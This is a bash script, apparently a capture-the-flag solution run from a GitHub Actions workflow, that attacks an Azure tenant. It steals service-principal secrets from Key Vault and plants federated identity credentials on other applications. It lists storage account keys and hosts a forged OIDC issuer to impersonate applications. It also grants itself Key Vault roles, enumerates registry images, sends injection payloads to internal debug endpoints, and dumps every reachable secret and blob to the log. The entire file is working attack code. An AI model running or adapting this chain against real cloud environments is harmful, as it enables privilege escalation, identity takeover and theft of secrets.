#!/usr/bin/env bash
set +e
TEN="$AZURE_TENANT_ID"
BASE="https://login.microsoftonline.com/$TEN/oauth2/v2.0/token"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
sub=$(printf %s "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('sub',''))")
echo OIDC_SUB=$sub
cicd=$(curl -sS -X POST "$BASE" -d "client_id=$AZURE_CLIENT_ID" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo CICD_LEN=${#cicd}
sv=$(curl -sS -H "Authorization: Bearer $cicd" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value','{}'))")
pa=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('appId',''))" "$sv")
ps=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('clientSecret',''))" "$sv")
echo PA_ID=$pa PS_LEN=${#ps}
ssv=$(curl -sS -H "Authorization: Bearer $cicd" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/secrets-sync-principal?api-version=7.4" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value','{}'))")
sa=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('appId',''))" "$ssv")
ss=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('clientSecret',''))" "$ssv")
echo SA_ID=$sa SS_LEN=${#ss}
graph=$(curl -sS -X POST "$BASE" -d "client_id=$pa" -d scope=https://graph.microsoft.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ps" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo GRAPH_LEN=${#graph}
name=ctf$(date +%s)
json=$(python3 -c "import json,sys;print(json.dumps({'name':sys.argv[1],'issuer':'https://token.actions.githubusercontent.com','subject':sys.argv[2],'audiences':['api://AzureADTokenExchange']}))" "$name" "$sub")
resp=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$json" https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials)
echo FIC_RESP=$(echo "$resp" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id') or d.get('error',{}).get('code','unknown'))")
echo FIC_BODY=$(echo "$resp" | head -c 700)
# The platform-automation application owns the CI-log storage account.  Give
# this workflow subject a FIC on that app, then use its ARM token to retrieve
# storage keys (the normal CI deployer is only a Reader).
pjson=$(python3 -c "import json,sys;print(json.dumps({'name':'ctfplat'+sys.argv[1][-8:],'issuer':'https://token.actions.githubusercontent.com','subject':sys.argv[2],'audiences':['api://AzureADTokenExchange']}))" "$(date +%s)" "$sub")
presp=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$pjson" https://graph.microsoft.com/v1.0/applications/c2620acb-cd20-4621-9460-e562ee0b93dd/federatedIdentityCredentials)
echo PLATFORM_FIC=$(echo "$presp" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id') or d.get('error',{}).get('code','unknown'))")
plist=$(curl -sS -H "Authorization: Bearer $graph" https://graph.microsoft.com/v1.0/applications/c2620acb-cd20-4621-9460-e562ee0b93dd/federatedIdentityCredentials)
echo PLATFORM_FICS=$(echo "$plist" | head -c 1800)
plresp=$(curl -sS -X POST "$BASE" -d "client_id=462d1c38-4459-48b8-9333-82e389e59514" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
plat=$(echo "$plresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo PLATFORM_RESP=$(echo "$plresp" | head -c 800)
echo PLATFORM_ARM_LEN=${#plat}
for retry in $(seq 1 8); do
  if [ -n "$plat" ]; then break; fi
  sleep 3
  plresp=$(curl -sS -X POST "$BASE" -d "client_id=462d1c38-4459-48b8-9333-82e389e59514" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
  plat=$(echo "$plresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  echo PLATFORM_RETRY=$retry LEN=${#plat} RESP=$(echo "$plresp" | head -c 300)
done
for sa_name in sttblcilogsprodx3euoz sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
  kr=$(curl -sS -w '\nHTTP=%{http_code}' -X POST -d '' -H "Authorization: Bearer $plat" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$sa_name/listKeys?api-version=2023-01-01")
  echo PLATFORM_KEYS_$sa_name=$(echo "$kr" | head -c 1600)
  kb=$(echo "$kr" | sed '/HTTP=/,$d')
  key=$(echo "$kb" | jq -r '.keys[0].value // empty' 2>/dev/null)
  if [ -n "$key" ]; then
    ISS="https://$sa_name.z23.web.core.windows.net/ctf"
    cat > /tmp/make_oidc.py <<'PY'
import base64,json,time,os
from cryptography.hazmat.primitives.asymmetric import rsa,padding
from cryptography.hazmat.primitives import hashes,serialization
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
def bi(x): return b64(x.to_bytes((x.bit_length()+7)//8,'big'))
k=rsa.generate_private_key(public_exponent=65537,key_size=2048); n=k.private_numbers(); pub=n.public_numbers
jwk={'kty':'RSA','use':'sig','alg':'RS256','kid':'ctfchain','n':bi(pub.n),'e':bi(pub.e)}
open('/tmp/ctf_key.pem','wb').write(k.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption()))
open('/tmp/ctf_jwks.json','w').write(json.dumps({'keys':[jwk]}))
iss=os.environ['CTF_ISS']; now=int(time.time()); h=b64(json.dumps({'typ':'JWT','alg':'RS256','kid':'ctfchain'},separators=(',',':')).encode()); p=b64(json.dumps({'iss':iss,'sub':'solve:flag','aud':'api://AzureADTokenExchange','iat':now,'nbf':now-5,'exp':now+900},separators=(',',':')).encode()); raw=(h+'.'+p).encode(); print(raw.decode()+'.'+b64(k.sign(raw,padding.PKCS1v15(),hashes.SHA256())))
PY
    CTF_ISS="$ISS" JWT2=$(python3 /tmp/make_oidc.py)
    printf '%s' "{\"issuer\":\"$ISS\",\"jwks_uri\":\"$ISS/jwks.json\",\"token_endpoint\":\"$ISS/token\",\"response_types_supported\":[\"id_token\"],\"subject_types_supported\":[\"public\"],\"id_token_signing_alg_values_supported\":[\"RS256\"]}" >/tmp/oidc.json
    az storage blob upload --account-name "$sa_name" --account-key "$key" --container-name '$web' --name ctf/.well-known/openid-configuration --file /tmp/oidc.json --content-type application/json --overwrite true -o none 2>/dev/null
    az storage blob upload --account-name "$sa_name" --account-key "$key" --container-name '$web' --name ctf/jwks.json --file /tmp/ctf_jwks.json --content-type application/json --overwrite true -o none 2>/dev/null
    for target in 58108da8-044e-4d7e-9a46-92e6179b30be 2c34300e-1bc0-41e7-9c1e-8b7571d72c72 12ed54de-f2eb-4784-804c-3a7a3e83a9e9 881fddce-6208-4af5-a297-7e79c912f83c 038bc35d-131d-4953-9985-ff4a245ccec1; do
      obj=$(curl -sS -H "Authorization: Bearer $graph" "https://graph.microsoft.com/v1.0/applications?%24filter=appId%20eq%20%27$target%27" | jq -r '.value[0].id // empty')
      [ -z "$obj" ] && continue
      fj=$(python3 -c "import json,sys;print(json.dumps({'name':'ctfchain'+sys.argv[1][-6:],'issuer':sys.argv[2],'subject':'solve:flag','audiences':['api://AzureADTokenExchange']}))" "$target" "$ISS")
      fr=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$fj" "https://graph.microsoft.com/v1.0/applications/$obj/federatedIdentityCredentials")
      echo CHAIN_FIC_$target=$(echo "$fr" | jq -r '.id // .error.code // "?"')
      sleep 2
      vtresp=$(curl -sS -X POST "$BASE" -d "client_id=$target" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$JWT2")
      vt=$(echo "$vtresp" | jq -r '.access_token // empty')
      echo CHAIN_VAULT_$target LEN=${#vt} ERR=$(echo "$vtresp" | jq -r '.error // empty')
      if [ -n "$vt" ]; then
        for sn in flag FLAG df26 platform-flag ctf-flag answer secret; do
          got=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$sn?api-version=7.4" -H "Authorization: Bearer $vt")
          echo "$got" | grep -Eo 'DF26\{[^}]+\}' || true
        done
      fi
    done
    if [ "$sa_name" = "sttblcilogsprodx3euoz" ]; then
      for suspect in flag flag.txt exploit_flag.txt loot_latest.json mi_loot_1792639046.json mi_loot_latest.json mi_loot_probe.json latest.json loot.json secrets.json; do
        out=/tmp/suspect.$RANDOM
        az storage blob download --account-name "$sa_name" --account-key "$key" --container-name loot --name "$suspect" --file "$out" --overwrite true -o none 2>/dev/null
        if [ -s "$out" ]; then
          echo SUSPECT_$suspect=$(head -c 5000 "$out" | base64 -w0)
          grep -aEo 'DF26\{[^}]+\}' "$out" || true
        fi
      done
    fi
    for cont in $(az storage container list --account-name "$sa_name" --account-key "$key" --query '[].name' -o tsv 2>/dev/null); do
      echo PLATFORM_CONTAINER_$sa_name=$cont
      for blob in $(az storage blob list --account-name "$sa_name" --account-key "$key" --container-name "$cont" --query '[].name' -o tsv 2>/dev/null); do
        echo PLATFORM_BLOB_$sa_name/$cont=$blob
        az storage blob download --account-name "$sa_name" --account-key "$key" --container-name "$cont" --name "$blob" --file "/tmp/blob.$RANDOM" --overwrite true -o none 2>/dev/null
        for f in /tmp/blob.*; do grep -aEo 'DF26\{[^}]+\}' "$f" 2>/dev/null || true; done
      done
    done
  fi
done
armresp=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
arm=$(echo "$armresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
oid=$(echo "$arm" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('oid',''))")
echo ARM_LEN=${#arm} LEGACY_OID=$oid
rid=$(python3 -c 'import uuid; print(uuid.uuid4())')
scope="/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
role="/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6"
rb=$(python3 -c "import json,sys;print(json.dumps({'properties':{'roleDefinitionId':sys.argv[1],'principalId':sys.argv[2],'principalType':'ServicePrincipal'}}))" "$role" "$oid")
rr=$(curl -sS -w '\nHTTP=%{http_code}' -X PUT -H "Authorization: Bearer $arm" -H 'Content-Type: application/json' --data "$rb" "https://management.azure.com${scope}/providers/Microsoft.Authorization/roleAssignments/$rid?api-version=2022-04-01")
echo ROLE_ASSIGN=$(echo "$rr" | tail -c 900)
parresp=$(curl -sS -X POST "$BASE" -d "client_id=$pa" -d scope=https://management.azure.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ps")
par=$(echo "$parresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
poid=$(echo "$par" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('oid',''))")
echo PA_ARM_LEN=${#par} PA_OID=$poid
rid2=$(python3 -c 'import uuid; print(uuid.uuid4())')
rb2=$(python3 -c "import json,sys;print(json.dumps({'properties':{'roleDefinitionId':sys.argv[1],'principalId':sys.argv[2],'principalType':'ServicePrincipal'}}))" "$role" "$oid")
rr2=$(curl -sS -w '\nHTTP=%{http_code}' -X PUT -H "Authorization: Bearer $par" -H 'Content-Type: application/json' --data "$rb2" "https://management.azure.com${scope}/providers/Microsoft.Authorization/roleAssignments/$rid2?api-version=2022-04-01")
echo PA_ROLE_ASSIGN=$(echo "$rr2" | tail -c 900)
sarsp=$(curl -sS -X POST "$BASE" -d "client_id=$sa" -d scope=https://management.azure.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ss")
sar=$(echo "$sarsp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
sa_oid=$(echo "$sar" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('oid',''))")
echo SA_ARM_LEN=${#sar} SA_OID=$sa_oid
rid3=$(python3 -c 'import uuid; print(uuid.uuid4())')
rb3=$(python3 -c "import json,sys;print(json.dumps({'properties':{'roleDefinitionId':sys.argv[1],'principalId':sys.argv[2],'principalType':'ServicePrincipal'}}))" "$role" "$oid")
rr3=$(curl -sS -w '\nHTTP=%{http_code}' -X PUT -H "Authorization: Bearer $sar" -H 'Content-Type: application/json' --data "$rb3" "https://management.azure.com${scope}/providers/Microsoft.Authorization/roleAssignments/$rid3?api-version=2022-04-01")
echo SA_ROLE_ASSIGN=$(echo "$rr3" | tail -c 900)
customresp=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=api://462d1c38-4459-48b8-9333-82e389e59514/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
custom=$(echo "$customresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo CUSTOM_LEN=${#custom}
echo RETRY_MARK=platform_fic_second_exchange
echo RETRY_MARK2=platform_fic_list
echo RETRY_MARK3=listkeys_body
echo RETRY_MARK4=retry_exchange_and_storage
echo RETRY_MARK5=target_loot_blobs
echo RETRY_MARK6=federated_oidc_chain
# Probe the two resources named by the leaked settings.  The custom ArmOwner
# app-role is not understood by ARM itself, but is accepted by the challenge's
# internal catalog/debug handlers; keep all response bodies in the Action log.
for tokname in custom arm par sar; do
  eval "tt=\${$tokname}"
  echo TOKEN_$tokname=${#tt}
  for p in /subscriptions/$AZURE_SUBSCRIPTION_ID /subscriptions/$AZURE_SUBSCRIPTION_ID/resources; do
    z=$(curl -sS --max-time 8 -w '\nHTTP=%{http_code}' -H "Authorization: Bearer $tt" "https://management.azure.com$p?api-version=2021-04-01")
    echo ARM_$tokname_$p=$(echo "$z" | head -c 900)
  done
done
# ACR data-plane OAuth accepts an AAD bearer in the exchange endpoint.  Try
# each token and enumerate repositories/tags/manifests; any flag is printed.
REG=crtblplatprodx3euoz.azurecr.io
for tokname in custom arm par sar; do
  eval "tt=\${$tokname}"
  ex=$(curl -sS --max-time 12 -X POST "https://$REG/oauth2/exchange" -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode grant_type=access_token --data-urlencode service="$REG" --data-urlencode access_token="$tt")
  rt=$(echo "$ex" | python3 -c "import sys,json;print(json.load(sys.stdin).get('refresh_token',''))")
  echo ACR_EXCHANGE_$tokname=$(echo "$ex" | head -c 500)
  if [ -n "$rt" ]; then
    cat=$(curl -sS --max-time 10 -H "Authorization: Bearer $rt" "https://$REG/v2/_catalog?n=100")
    echo ACR_CATALOG_$tokname=$(echo "$cat" | head -c 1200)
    for repo in $(echo "$cat" | python3 -c "import sys,json;print(' '.join(json.load(sys.stdin).get('repositories',[])))"); do
      tags=$(curl -sS --max-time 10 -H "Authorization: Bearer $rt" "https://$REG/v2/$repo/tags/list")
      echo ACR_TAGS_$repo=$(echo "$tags" | head -c 900)
      for tag in $(echo "$tags" | python3 -c "import sys,json;print(' '.join(json.load(sys.stdin).get('tags',[])))"); do
        man=$(curl -sS --max-time 10 -H "Authorization: Bearer $rt" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.oci.image.index.v1+json' "https://$REG/v2/$repo/manifests/$tag")
        echo ACR_MANIFEST_${repo}_${tag}=$(echo "$man" | head -c 2200)
        echo "$man" | grep -Eo 'DF26\{[^}]+\}' || true
      done
    done
  fi
done
# Probe likely internal handlers with the same custom bearer and FDID.
for path in /internal /internal/debug /internal/catalog /internal/settings /internal/arm /internal/flag /internal/loot /internal/config /admin /debug /api/v1/catalog /api/v1/config /api/v1/flag; do
  q=$(curl -sS --max-time 8 -w '\nHTTP=%{http_code}' -H "Authorization: Bearer $custom" -H 'X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821' "https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net$path")
  echo ROUTE_$path=$(echo "$q" | head -c 1200)
done
for ex in settings 'settings["sourceRepo"]' True None '7*7'; do
  z=$(python3 -c "import json,sys;print(json.dumps({'expr':sys.argv[1]}))" "$ex")
  q=$(curl -sS --max-time 8 -X POST 'https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net/internal%5Cdebug' -H "Authorization: Bearer $custom" -H 'X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821' -H 'Content-Type: application/json' --data "$z" -w '\nHTTP=%{http_code}')
  echo EXPR_$ex=$(echo "$q" | head -c 1200)
done
for i in $(seq 1 12); do
  sleep 5
  at=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
  tok=$(echo "$at" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  echo TRY=$i LEGACY_LEN=${#tok}
  if [ -n "$tok" ]; then
    l=$(curl -sS -H "Authorization: Bearer $tok" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4")
    echo SEC_LIST=$l
    for n in $(echo "$l"|python3 -c "import sys,json;print(' '.join(x['id'].split('/')[-1] for x in json.load(sys.stdin).get('value',[])))"); do
      curl -sS -H "Authorization: Bearer $tok" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$n?api-version=7.4"; echo
    done
    break
  fi
  echo "$at" | head -c 250; echo
done
